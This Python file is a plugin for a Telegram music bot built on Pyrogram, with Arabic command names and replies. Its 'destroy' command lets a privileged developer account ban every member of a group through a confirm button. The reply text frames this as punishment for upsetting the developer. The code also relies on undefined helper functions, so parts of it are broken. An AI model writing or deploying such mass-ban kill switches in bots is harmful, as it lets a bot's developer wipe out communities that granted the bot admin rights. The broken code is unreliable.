import asyncio

import os
import time
import datetime
import requests
from config import START_IMG_URL
from pyrogram import filters
import random
from pyrogram import Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from strings.filters import command
from YukkiMusic import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
from YukkiMusic import app
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery


@app.on_message(
    command(["تدمير","دمر"])
    & ~filters.edited)
async def destroy_all_group(c: Client, m: Message):
    global mid
    mid = m
    keyboard = InlineKeyboardMarkup(inline_keyboard=[

        [InlineKeyboardButton("yas", callback_data="destruction")] +
        [InlineKeyboardButton("No", callback_data="destroyno")],

    ])
    await m.reply_text("طب زعلتم المطور استحمله زعله بااه",
                       reply_markup=keyboard)


@Client.on_callback_query(filters.regex("^destruction$"))
async def destroyyes(c: Client, m: CallbackQuery):
    if sudo(m):
        await m.message.delete()
        await mid.delete()
        async for x in c.iter_chat_members(m.message.chat.id):
            try:
                if x.user.id == get_bot_information()[0]:
                    continue
                else:
                    if sudooo2(x.user.id):
                        continue
                    else:
                        await c.ban_chat_member(m.message.chat.id, x.user.id)
            except Exception as er:
                continue
    else:
        await c.answer_callback_query(m.id, text="مش مسموحلك بالزرار الخطير ده 🖤🙂", show_alert=True)


@Client.on_callback_query(filters.regex("^destroyno$"))
async def destroyno(c: Client, m: CallbackQuery):
    if sudo(m):
        await m.message.delete()
        await m.message.reply_text("مااحلاك حبيبي المطور🥺❤️")
    else:
        await c.answer_callback_query(m.id, text="مش مسموحلك بالزرار الخطير ده 🖤🙂", show_alert=True)
